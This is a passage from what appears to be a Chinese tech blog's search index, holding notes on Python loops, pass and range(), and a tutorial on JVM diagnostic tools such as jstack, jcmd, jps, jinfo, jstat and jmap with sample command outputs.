```\n\n   \n\n2. while循环\n\n   要条件满足，就不断循环，条件不满足时退出循环\n\n3. 循环中的 break、continue 语句及 else 子句\n\n   - break 语句将跳出最近的一层 for 或 while 循环\n   \n   - for 或 while 循环可以包括 else 子句（完成循环之后执行）\n   \n     在 for 循环中，else 子句会在循环成功结束最后一次迭代之后执行。\n   \n     在 while 循环中，它会在循环条件变为假值后执行。\n   \n     无论哪种循环，如果因为 [`break`](https://docs.python.org/zh-cn/3.11/reference/simple_stmts.html#break) 而结束，那么 `else` 子句就 **不会** 执行。\n   \n     ```python\n     # 循环配合else使用\n     users = {'Hans': 'active', 'Éléonore': 'inactive', '景太郎': 'active'}\n     for user, status in users.copy().items():\n         if status == 'inactive':\n             continue\n     else:\n         print(\"1.done>>>>>>>>>>>>>>>>>>>>\")\n     \n     \n     # 无论哪种循环，如果因为 break 而结束，那么 else 子句就 不会 执行。\n     for user, status in users.copy().items():\n         if status == 'inactive':\n             break\n     else:\n         print(\"2.done>>>>>>>>>>>>>>>>>>>>\")\n     \n     ```\n   \n     ```python\n     1.done>>>>>>>>>>>>>>>>>>>>\n     {'Hans': 'active', 'Éléonore': 'inactive', '景太郎': 'active'}\n     ```\n\n## pass语句\n\n[`pass`](https://docs.python.org/zh-cn/3.11/reference/simple_stmts.html#pass) 语句不执行任何动作。语法上需要一个语句，但程序毋需执行任何动作时，可以使用该语句。例如：\n\n```py\nwhile True:\n    pass  # Busy-wait for keyboard interrupt (Ctrl+C)\n```\n\n这常用于创建一个最小的类：\n\n```py\nclass MyEmptyClass:\n    pass\n```\n\n[`pass`](https://docs.python.org/zh-cn/3.11/reference/simple_stmts.html#pass) 还可用作函数或条件语句体的占位符，让你保持在更抽象的层次进行思考。\n\n`pass` 会被默默地忽略：\n\n```python\ndef initlog(*args):\n    pass   # Remember to implement this!\n```\n\n","tags":["Python"],"categories":["后端","Python"]},{"title":"Python内置函数","url":"/20250619/d59aed63.html","content":"\n# range()\n\n内置函数 [`range()`](https://docs.python.org/zh-cn/3.11/library/stdtypes.html#range) 用于生成等差数列：\n\n1. 定义\n\n   *class* **range**(*stop*)\n\n   *class* **range**(*start*, *stop*[, *step*])\n\n2. 例子\n\n   ```python\n   list(range(10))\n   [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n   list(range(1, 11))\n   [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n   list(range(0, 30, 5))\n   [0, 5, 10, 15, 20, 25]\n   list(range(0, 10, 3))\n   [0, 3, 6, 9]\n   list(range(0, -10, -1))\n   [0, -1, -2, -3, -4, -5, -6, -7, -8, -9]\n   list(range(0))\n   []\n   list(range(1, 0))\n   []\n   ```\n\n\n3. 说明\n\n   [`range()`](https://docs.python.org/zh-cn/3.11/library/stdtypes.html#range) 返回的对象在很多方面和列表的行为一样，但其实它和列表不一样。该对象只有在被迭代时才一个一个地返回所期望的列表项，并没有真正生成过一个含有全部项的列表，从而节省了空间。\n\n# type()\n\n# isinstance()\n","tags":["Python"],"categories":["后端","Python"]},{"title":"JVM性能调优工具","url":"/20250619/cc1c3bcb.html","content":"\n\n\n# jstack：Java堆栈跟踪工具\n\njstack（Stack Trace for Java）命令用于**生成虚拟机当前时刻的线程快照**（一般称为threaddump或者javacore文件）。\n\n线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合，生成线程快照的主要目的是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等，都是导致线程长时间停顿的常见原因。线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者等待着什么资源。\n\n命令格式\n **jstack** [option]  LVMID\n\n\n\n| 参数 | 说明                                                         |\n| ---- | ------------------------------------------------------------ |\n| -l   | long listings，会打印出额外的锁信息，在发生死锁时可以用jstack -l pid来观察锁持有情况 |\n| -m   | mixed mode，不仅会输出Java堆栈信息，如果调用到本地方法的话，可以显示C/C++的堆栈 |\n| -F   | 当正常输出请求不被响应时，强制输出线程堆栈                   |\n\n在JDK 1.5中，java.lang.Thread类新增了一个getAllStackTraces（）方法用于获取虚拟机中所有线程的StackTraceElement对象。\n\n使用这个方法可以通过简单的几行代码就完成jstack的大部分功能，在实际项目中不妨调用这个方法做个管理员页面，可以随时使用浏览器来查看线程堆栈。\n\n```html\n＜%@page import=\"java.util.Map\"%＞\n＜html＞\n＜head＞\n＜title＞服务器线程信息＜/title＞\n＜/head＞\n＜body＞\n＜pre＞\n＜%\nfor（Map.Entry＜Thread,StackTraceElement[]＞stackTrace：Thread.getAllStackTraces（）.entrySet（））{\n　　Thread thread=（Thread）stackTrace.getKey（）；\n　　StackTraceElement[]stack=（StackTraceElement[]）stackTrace.getValue（）；\n　　if（thread.equals（Thread.currentThread（）））{\n　　　　continue；\n　　}\n　　out.print（\"\\n线程：\"+ thread.getName（）+\"\\n\"）；\n　　for（StackTraceElement element：stack）{\n　　　　out.print（\"\\t\"+element+\"\\n\"）；\n　　}\n}\n%＞\n＜/pre＞\n＜/body＞\n＜/html＞\n```\n\n\n\n- jps 查看进程ID\n\n    ```bash\n    C:\\Users\\Administrator>jps\n    10904 Jps\n    3512\n    11228 Launcher\n    12220 Bank\n    ```\n\n- jstack 打印堆栈信息\n\n    ```bash\n    C:\\Users\\Administrator>jstack -l 12220\n    2021-12-26 22:09:55\n    Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.131-b11 mixed mode):\n    \n    \"DestroyJavaVM\" #16 prio=5 os_prio=0 tid=0x00000000029e2800 nid=0xf8 waiting on condition [0x0000000000000000]\n       java.lang.Thread.State: RUNNABLE\n    \n       Locked ownable synchronizers:\n            - None\n    \n    \"四号\" #15 prio=5 os_prio=0 tid=0x000000001e5c8000 nid=0x3524 waiting for monitor entry [0x000000001f63f000]\n       java.lang.Thread.State: BLOCKED (on object monitor)\n            at com.hots.chapter7.TickWindowRunnable.run(Bank.java:27)\n            - waiting to lock <0x000000076b62bf28> (a java.lang.Object)\n            at java.lang.Thread.run(Thread.java:748)\n    \n       Locked ownable synchronizers:\n            - None\n    \n    \"三号\" #14 prio=5 os_prio=0 tid=0x000000001e5c7800 nid=0x18b4 waiting for monitor entry [0x000000001f53f000]\n       java.lang.Thread.State: BLOCKED (on object monitor)\n            at com.hots.chapter7.TickWindowRunnable.run(Bank.java:27)\n            - waiting to lock <0x000000076b62bf28> (a java.lang.Object)\n            at java.lang.Thread.run(Thread.java:748)\n    ...\n    ```\n\n      \n\n- jstack 打印堆栈信息到文件\n\n    ```bash\n    C:\\Users\\Administrator>jstack -l 12220 >> test.txt\n    \n    # 打印结果保存到目录：C:\\Users\\Administrator下\n    ```\n\n    \n\n# jcmd：虚拟机工具\n\n## jcmd -l：列出当前运行的所有虚拟机\n\n| 参数 | 说明                         |\n| ---- | ---------------------------- |\n| -l   | 参数-l表示列出所有java虚拟机 |\n\n## jcmd [pid] help：列出该虚拟机支持的所有命令\n\n针对每一个虚拟机，可以使用help命令列出该虚拟机支持的所有命令\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 help\n13204:\nThe following commands are available:\nJFR.stop\nJFR.start\nJFR.dump\nJFR.check\nVM.native_memory\nVM.check_commercial_features\nVM.unlock_commercial_features\nManagementAgent.stop\nManagementAgent.start_local\nManagementAgent.start\nGC.rotate_log\nThread.print\nGC.class_stats\nGC.class_histogram\nGC.heap_dump\nGC.run_finalization\nGC.run\nVM.uptime\nVM.flags\nVM.system_properties\nVM.command_line\nVM.version\nhelp\n```\n\n其中具体举例\n\n## jcmd  [pid]  VM.uptime： 查看虚拟机启动时间\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 VM.uptime\n13204:\n142.109 s\n```\n\n## jcmd [pid] Thread.print：打印线程栈信息\n\n （该命令同 [jstack](https://www.jianshu.com/p/025cb069cb69) 命令）\n\n![image-20211202105919556](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211202105919556-1667231157378-120.png)    \n\n## jcmd [pid]  GC.class_histogram：查看系统中类统计信息\n\n 这里和jmap -histo pid的效果是一样的 。这个可以查看每个类的实例数量和占用空间大小。\n\n![image-20211202110015127](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211202110015127-1667231157378-121.png) \n\n## jcmd [pid] GC.heap_dump [filepath&name]\n\n跟 jmap命令：jmap -dump:format=b,file=heapdump.phrof pid 效果一样。 \n\n导出的 dump 文件，可以使用MAT 或者 Visual VM 等工具进行分析。\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 GC.heap_dump D:\\test.hprof\n13204:\nHeap dump file created\n```\n\n## jcmd [pid] VM.system_properties： 查看 JVM 的属性信息\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 VM.system_properties\n13204:\n#Thu Dec 02 11:03:17 CST 2021\njava.vendor=Oracle Corporation\npreload.project.path=D\\:/Workspace/GIT/XXX\nsun.java.launcher=SUN_STANDARD\nsun.management.compiler=HotSpot 64-Bit Tiered Compilers\nsun.nio.ch.bugLevel=\nidea.config.path=C\\:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3\nidea.paths.selector=IntelliJIdea2021.3\nkotlin.daemon.client.alive.path=\"C\\:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\kotlin-idea-6412110316068151676-is-running\"\nos.name=Windows 10\nsun.boot.class.path=D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\resources.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\rt.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\sunrsasign.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\jsse.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\jce.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\charsets.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\lib\\\\jfr.jar;D\\:\\\\Developer\\\\java\\\\jdk1.8.0_131\\\\jre\\\\classes\nsun.desktop=windows\nidea.plugins.path=C\\:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/plugins\njava.vm.specification.vendor=Oracle Corporation\njava.runtime.version=1.8.0_131-b11\nio.netty.serviceThreadPrefix=Netty\nuser.name=Administrator\n...\n```\n\n## jcmd [pid] VM.flags： 查看 JVM 的启动参数\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 VM.flags\n13204:\n-XX:CICompilerCount=4 -XX:InitialHeapSize=268435456 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=357564416 -XX:MinHeapDeltaBytes=524288 -XX:NewSize=89128960 -XX:OldSize=179306496 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps -XX:-UseLargePagesIndividualAllocation -XX:+UseParallelGC\nPS C:\\Users\\Administrator>\n```\n\n\n\n## jcmd [pid] PerfCounter.print：查看 JVM 性能相关的参数\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 PerfCounter.print\n13204:\njava.ci.totalTime=26357322\njava.cls.loadedClasses=3480\njava.cls.sharedLoadedClasses=0\njava.cls.sharedUnloadedClasses=0\njava.cls.unloadedClasses=15\njava.property.java.class.path=\"D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-launcher.jar;D:/Developer/java/jdk1.8.0_131/lib/tools.jar\"\njava.property.java.endorsed.dirs=\"\"\"\"\njava.property.java.ext.dirs=\"D:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\ext;C:\\Windows\\Sun\\Java\\lib\\ext\"\njava.property.java.home=\"D:\\Developer\\java\\jdk1.8.0_131\\jre\"\n......\n```\n\n\n\n## jcmd [pid] GC.run：执行GC\n\n对 JVM 执行 java.lang.System.gc()\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 GC.run\n13204:\nCommand executed successfully\n```\n\n## jcmd [pid] GC.run_finalization：执行FULL GC\n\n对 JVM 执行 java.lang.System.runFinalization()\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 GC.run_finalization\n13204:\nCommand executed successfully\n```\n\n\n\n补充：\n\n```java\nsystem.gc()和system.runFinalization()区别作用：\n  \nSystem.gc(); //告诉垃圾收集器打算进行垃圾收集，而垃圾收集器进不进行收集是不确定的 \nSystem.runFinalization();  //强制调用已经失去引用的对象的finalize方法 \n\n\n// java中的finalize()方法\n// 当垃圾收集器认为没有指向对象实例的引用时，会在销毁该对象之前调用finalize() 方法。\n// 该方法最常见的作用是确保释放实例占用的全部资源。java并不保证定时为对象实例调用该方法，甚至不保证方法会被调用，所以该方法不应该用于正常内存处理。\n```\n\n## jcmd [pid] VM.command_line：查看 JVM 的启动命令行\n\n```bash\nPS C:\\Users\\Administrator> jcmd 13204 VM.command_line\n13204:\nVM Arguments:\njvm_args: -Xmx1024m -Djava.awt.headless=true  。。。 -Dtmh.generate.line.numbers=true\njava_command: org.jetbrains.jps.cmdline.Launcher D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders-6.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-javac-extension-1.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/util.jar;。。。D:/Developer/java/jdk1.8.0_131/lib/tools.jar\nLauncher Type: SUN_STANDARD\n```\n\n# jps：列出系统中所有的JAVA应用程序\n\n1. 概述\t\n\n​\tjps 命令类似与 linux 的 ps 命令，但是它只列出系统中所有的 Java 应用程序。 通过 jps 命令可以方便地查看 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息。\n\n​\t如果在 linux 中想查看 java 的进程，一般我们都需要 ps -ef | grep java 来获取进程 ID。 如果只想获取 Java 程序的进程，可以直接使用 jps 命令来直接查看。\n\n```\nPS C:\\Users\\Administrator> jps\n16208\n5712 Jps\n13204 Launcher\n```\n\n2. 用法\n\n   ```\n   PS C:\\Users\\Administrator> jps -help\n   usage: jps [-help]\n          jps [-q] [-mlvV] [<hostid>]\n   \n   Definitions:\n       <hostid>:      <hostname>[:<port>]\n   ```\n\n   参数说明\n\n   | 参数 | 说明                                        |\n   | ---- | ------------------------------------------- |\n   | -q   | 只输出进程 ID                               |\n   | -m   | 输出传入 main 方法的参数                    |\n   | -l   | 输出完全的包名，应用主类名，jar的完全路径名 |\n   | -v   | 输出jvm参数                                 |\n   | -V   | 输出通过flag文件传递到JVM中的参数           |\n\n3. 示例\n\n   - jps\n\n     ```java\n     无参数：显示进程的ID 和 启动类的名称。\n     ```\n\n   - jps -q \n\n     ```java\n     参数 -q 只输出进程ID，而不显示出类的名称\n     ```\n\n     ```bash\n     PS C:\\Users\\Administrator> jps -q\n     16208\n     13204\n     6132\n     ```\n\n   - jps -m\n\n     ```java\n     可以输出传递给 Java 进程（main 方法）的参数。\n     ```\n\n     ```bash\n     PS C:\\Users\\Administrator> jps -m\n     16208\n     10244 Jps -m\n     13204 Launcher D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders-6.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-javac-extension-1.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/util.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/annotations.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/3rd-party-rt.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/jna.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/kotlin-stdlib-jdk8.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/protobuf.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/platform-api.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/jps-model.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/javac2.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/forms_rt.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/qdox.jar;D:/Developer\n     ```\n\n     \n\n   - jps -l\n\n     ```\n     可以输出主函数的完整路径（类的全路径）。\n     ```\n\n     ```\n     PS C:\\Users\\Administrator> jps -l\n     16208\n     13204 org.jetbrains.jps.cmdline.Launcher\n     5080 sun.tools.jps.Jps\n     ```\n\n   - jsp -v\n\n     ```\n     可以显示传递给 Java 虚拟机的参数。\n     ```\n\n     ```\n     PS C:\\Users\\Administrator> jps -v\n     16208  exit -Xms128m -Xmx750m -XX:ReservedCodeCacheSize=512m -XX:+IgnoreUnrecognizedVMOptions -XX:+UseG1GC -XX:SoftRefLRUPolicyMSPerMB=50 -XX:CICompilerCount=2 -XX:+HeapDumpOnOutOfMemoryError -XX:-OmitStackTraceInFastThrow -ea -Dsun.io.useCanonCaches=false -Djdk.http.auth.tunneling.disabledSchemes=\"\" -Djdk.attach.allowAttachSelf=true -Djdk.module.illegalAccess.silent=true -Dkotlinx.coroutines.debug=off -Xms3058m -Xmx5500m -XX:ReservedCodeCacheSize=2048m -XX:SoftRefLRUPolicyMSPerMB=100 -Djb.vmOptionsFile=C:\\Users\\Administrator\\AppData\\Roaming\\JetBrains\\IntelliJIdea2021.3\\idea64.exe.vmoptions -Djava.system.class.loader=com.intellij.util.lang.PathClassLoader -Didea.vendor.name=JetBrains -Didea.paths.selector=IntelliJIdea2021.3 -Didea.jre.check=true -Dsplash=true -Dide.native.launcher=true -XX:ErrorFile=C:\\Users\\Administrator\\java_error_in_idea64_%p.log -XX:HeapDumpPath=C:\\Users\\Administrator\\java_error_in_idea64.hprof\n     6708 RemoteMavenServer36 -Djava.awt.headless=true -Dmaven.defaultProjectBuilder.disableGlobalModelCache=true -Didea.version=2021.3 -Didea.maven.embedder.version=3.8.1 -Xmx1024m -Dmaven.ext.class.path=D:\\Developer\\JetBrains\\IntelliJ IDEA 2021.1.1\\plugins\\maven\\lib\\maven-event-listener.jar -Dfile.encoding=GBK\n     16968 Jps -Dapplication.home=D:\\Developer\\java\\jdk1.8.0_131 -Xms8m\n     16716 Launcher -Xmx1024m -Djava.awt.headless=true -Djava.endorsed.dirs=\"\" -Dpreload.project.path=D:/Workspace/OWN/Learn -Dpreload.config.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/options -Dexternal.project.config=C:\\Users\\Administrator\\AppData\\Local\\JetBrains\\IntelliJIdea2021.3\\external_build_system\\learn.11acc208 -Dcompile.parallel=true -Drebuild.on.dependency.change=true -Djdt.compiler.useSingleThread=true -Daether.connector.resumeDownloads=false -Dio.netty.initialSeedUniquifier=1264189494698199162 -Dfile.encoding=GBK -Duser.language=zh -Duser.country=CN -Didea.paths.selector=IntelliJIdea2021.3 -Didea.home.path=D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1 -Didea.config.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3 -Didea.plugins.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/plugins -Djps.log.dir=C:/Users/Administrator/AppData/Local/JetBrains/IntelliJIdea2021.3/log/build-log -Djps.fallback.jdk.home=D:/Developer/JetBrains/IntelliJ IDEA 202\n     ```\n\n# jinfo：实时查看和调整虚拟机运行参数\n\n\n\n命令格式 : **jinfo** [option] [args]  `LVMID`\n\n\n\n使用**jps**命令的**-v**参数可以查看虚拟机启动时显式指定的参数列表，但如果想知道未被显式指定的参数的系统默认值，除了去找资料外，就只能使用jinfo的-flag选项进行查询了\n\n（如果只限于JDK 1.6或以上版本的话，使用java-XX：+PrintFlagsFinal查看参数默认值也是一个很好的选择），jinfo还可以使用-sysprops选项把虚拟机进程的System.getProperties()的内容打印出来。这个命令在JDK 1.5时期已经随着Linux版的JDK发布，当时只提供了信息查询的功能，JDK 1.6之后，jinfo在Windows和Linux平台都有提供，并且加入了运行期修改参数的能力，可以使用-flag[+|-]name或者-flag name=value修改一部分运行期可写的虚拟机参数值。JDK 1.6中，jinfo对于Windows平台功能仍然有较大限制，只提供了最基本的-flag选项。\n\n\n\noption参数:\n\n| 参数      | 说明                                                         |\n| --------- | ------------------------------------------------------------ |\n| -flag     | 输出指定args参数的值                                         |\n| -flags    | 不需要args参数，输出所有JVM参数的值<br />![image-20230425140532043](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230425140532043.png) |\n| -sysprops | 输出系统属性，等同于System.getProperties()                   |\n|           |                                                              |\n|           |                                                              |\n\n \n\n\n\n# jstat：虚拟机统计信息监视工具\n\n> 它可以显示出虚拟机进程中的类装载、内存、垃圾收集、JIT编译等运行数据。\n\n命令格式\n：  **jstat** [option] `LVMID` [interval] [count]\n\n\n\n| 参数       | 说明               |\n| ---------- | ------------------ |\n| [option]   | 操作参数           |\n| LVMID      | 本地虚拟机进程ID   |\n| [interval] | 连续输出的时间间隔 |\n| [count]    | 连续输出的次数     |\n\n对于命令格式中的VMID与LVMID需要特别说明一下：\n如果是本地虚拟机进程，VMID与LVMID是一致的;\n\n如果是远程虚拟机进程，那LVMID的格式应当是：protocol://lvmid@hostname:port/servername\n\n**参数interval和count代表查询间隔(单位毫秒)和次数，如果省略这两个参数，说明只查询一次。**\n\n\n\n举例：假设需要每250毫秒查询一次进程2764垃圾收集状况，一共查询20次，那命令应当是：`jstat -gc 2764 250 20`\n\n选项option代表着用户希望查询的虚拟机信息，主要分为3类：类装载、垃圾收集、运行期编译状况，具体选项及作用请参考表4-3中的描述。\n\n![image-20230424171605151](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424171605151.png) \n\noption 参数详解\n\n| 参数                                                         | 说明                                                         |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| **-class**：监视类装载、卸载数量、总空间以及耗费的时间       | ![image-20230424171946376](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424171946376-1682328214575-4-1682328278125-7.png)<br /><br />Loaded : 加载class的数量<br/>Bytes : class字节大小<br/>Unloaded : 未加载class的数量<br/>Bytes : 未加载class的字节大小<br/>Time : 加载时间 |\n| **-compiler**：输出JIT编译过的方法数量耗时等                 | ![image-20230424172122535](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424172122535-1682328140305-1-1682328290986-10.png)<br /><br /><br />Compiled : 编译数量 <br/>Failed : 编译失败数量 <br/>Invalid : 无效数量 <br/>Time : 编译耗时 <br/>FailedType : 失败类型 <br/>FailedMethod : 失败方法的全限定名 |\n| **-gc**：垃圾回收堆的行为统计                                | DEMO：每250毫秒查询一次进程2764垃圾收集状况，一共查询20次：<br />![image-20230424172539124](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424172539124-1682328346591-13.png)<br /><br />新生代Eden区（E，表示Eden）使用了6.2%的空间<br />两个Survivor区（S0、S1，表示Survivor0、Survivor1）里面都是空的<br />老年代（O，表示Old）和永久代（P，表示Permanent）则分别使用了41.42%和47.20%的空间。<br />程序运行以来共发生Minor GC（YGC，表示Young GC）16次，总耗时0.105秒，<br />发生Full GC（FGC，表示Full GC）3次，Full GC总耗时（FGCT，表示Full GC Time）为0.472秒，<br />所有GC总耗时（GCT，表示GC Time)为0.577秒。<br /><br /><br />C 即Capacity 总容量，U 即Used 已使用的容量.<br />**S0C** : survivor0区的总容量 <br/>**S1C** : survivor1区的总容量 <br/>**S0U** : survivor0区已使用的容量 <br/>**S1C** : survivor1区已使用的容量 <br/>**EC** : Eden区的总容量 <br/>**EU** : Eden区已使用的容量 <br/>**OC** : Old区的总容量 <br/>**OU** : Old区已使用的容量 <br/>**PC** 当前perm的容量 (KB) <br/>**PU** perm的使用 (KB) <br/>**YGC** : 新生代垃圾回收次数 <br/>**YGCT** : 新生代垃圾回收时间 <br/>**FGC** : 老年代垃圾回收次数 <br/>**FGCT** : 老年代垃圾回收时间 <br/>**GCT** : 垃圾回收总消耗时间 |\n| **-gccapacity**：同-gc，不过还会输出Java堆各区域使用到的最大、最小空间 | jstat -gccapacity 1262<br /><br />**NGCMN** : 新生代占用的最小空间 <br/>**NGCMX** : 新生代占用的最大空间 <br/>**OGCMN** : 老年代占用的最小空间 <br/>**OGCMX** : 老年代占用的最大空间 <br/>**OGC**：当前年老代的容量 (KB) <br/>**OC**：当前年老代的空间 (KB) <br/>**PGCMN** : perm占用的最小空间 <br/>**PGCMX** : perm占用的最大空间 |\n| **-gcutil**：同-gc，不过输出的是已使用空间占总空间的百分比   |                                                              |\n| **-gccause**： 垃圾收集统计概述（同-gcutil），附加最近两次垃圾回收事件的原因 | ![image-20230424173514901](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424173514901-1682328923881-17.png) <br />**LGCC**：最近垃圾回收的原因<br/>**GCC**：当前垃圾回收的原因 |\n| **-gcnew**：统计新生代的行为                                 | ![image-20230424174422588](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424174422588-1682329539903-20.png) <br /><br />**TT**：Tenuring threshold(提升阈值)<br/>**MTT**：最大的tenuring threshold<br/>**DSS**：survivor区域大小 (KB) |\n| **-gcnewcapacity**：新生代与其相应的内存空间的统计           | jstat -gcnewcapacity 28920 <br /><br />NGC:当前年轻代的容量 (KB)<br/>S0CMX:最大的S0空间 (KB)<br/>S0C:当前S0空间 (KB)<br/>ECMX:最大eden空间 (KB)<br/>EC:当前eden空间 (KB) |\n| **-gcold**：统计旧生代的行为                                 | jstat -gcold 28920                                           |\n| **-gcoldcapacity**：统计旧生代的大小和空间                   | jstat -gcoldcapacity 28920                                   |\n| **-gcpermcapacity**：永生代行为统计                          | jstat -gcpermcapacity 28920                                  |\n| **-printcompilation**：hotspot编译方法统计                   | ![image-20230424175043646](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424175043646-1682329849562-24.png) <br /><br />Compiled：被执行的编译任务的数量<br/>Size：方法字节码的字节数<br/>Type：编译类型<br/>Method：编译方法的类名和方法名。类名使用”/” 代替 “.” 作为空间分隔符. 方法名是给出类的方法名. 格式是一致于HotSpot – XX:+PrintComplation 选项 |\n\n\n\n\n\n# jmap\n\n> Java内存映像工具\n>\n> jmap（Memory Map for Java）命令用于生成堆转储快照（一般称为heapdump或dump文件）。\n>\n> 如果不使用**jmap**命令，要想获取Java堆转储快照，还有一些比较“暴力”的手段：譬如加-XX：+HeapDumpOnOutOfMemoryError参数，可以让虚拟机在OOM异常出现之后自动生成dump文件，通过-XX：+HeapDumpOnCtrlBreak参数则可以使用[Ctrl]+[Break]键让虚拟机生成dump文件，又或者在Linux系统下通过Kill-3命令发送进程退出信号“吓唬”一下虚拟机，也能拿到dump文件。\n>\n> **jmap**的作用并不仅仅是为了获取dump文件，它还可以查询finalize执行队列、Java堆和永久代的详细信息，如空间使用率、当前用的是哪种收集器等。\n>\n> 和**jinfo**命令一样，**jmap**有不少功能在Windows平台下都是受限的，除了生成dump文件的**-dump**选项和用于查看每个类的实例、空间占用统计的-histo选项在所有操作系统都提供之外，其余选项都只能在Linux/Solaris下使用。\n\n\n\n命令格式\n **jmap** [option] **LVMID**\n\noption参数\n\n| 参数 | 说明 |\n| ---- | ---- |\n|dump|生成堆转储快照，格式为:    -dump:[live, ] format=b,file=<filename>,  <br />其中live子参数说明是否只dump出存活的对象。|\n|finalizerinfo|显示在F-Queue队列等待Finalizer线程执行finalizer方法的对象|\n|heap|显示Java堆详细信息|\n|histo|显示堆中对象的统计信息，GC使用的算法，heap的配置及wise heap的使用情况<br />可以用此来判断内存目前的使用情况以及垃圾回收情况|\n|permstat|to print permanent generation statistics|\n|F|当-dump没有响应时，强制生成dump快照|\n\n## jmap -heap 28920：打印内存信息\n\n```bat\nC:\\Users\\Administrator>jmap -heap 7676\nAttaching to process ID 7676, please wait...\nDebugger attached successfully.\nServer compiler detected.\nJVM version is 25.131-b11\n\nusing thread-local object allocation.\nParallel GC with 8 thread(s) # GC 方式\n\nHeap Configuration: # 堆内存初始化配置\n   MinHeapFreeRatio         = 0  # 对应jvm启动参数-XX:MinHeapFreeRatio设置JVM堆最小空闲比率(default 40)\n   MaxHeapFreeRatio         = 100 # 对应jvm启动参数 -XX:MaxHeapFreeRatio设置JVM堆最大空闲比率(default 70)\n   MaxHeapSize              = 8562671616 (8166.0MB) # 对应jvm启动参数-XX:MaxHeapSize=设置JVM堆的最大大小\n   NewSize                  = 178782208 (170.5MB) # 对应jvm启动参数-XX:NewSize=设置JVM堆的‘新生代’的默认大小\n   MaxNewSize               = 2854223872 (2722.0MB) # 对应jvm启动参数-XX:MaxNewSize=设置JVM堆的‘新生代’的最大大小\n   OldSize                  = 358088704 (341.5MB) # 对应jvm启动参数-XX:OldSize=<value>:设置JVM堆的‘老生代’的大小\n   NewRatio                 = 2 # 对应jvm启动参数-XX:NewRatio=:‘新生代’和‘老生代’的大小比率\n   SurvivorRatio            = 8 # 对应jvm启动参数-XX:SurvivorRatio=设置年轻代中Eden区与Survivor区的大小比值\n   MetaspaceSize            = 21807104 (20.796875MB)\n   CompressedClassSpaceSize = 1073741824 (1024.0MB)\n   MaxMetaspaceSize         = 17592186044415 MB\n   G1HeapRegionSize         = 0 (0.0MB)\n\nHeap Usage: # 堆内存使用情况\nPS Young Generation\nEden Space: # Eden区内存分布\n   capacity = 2394423296 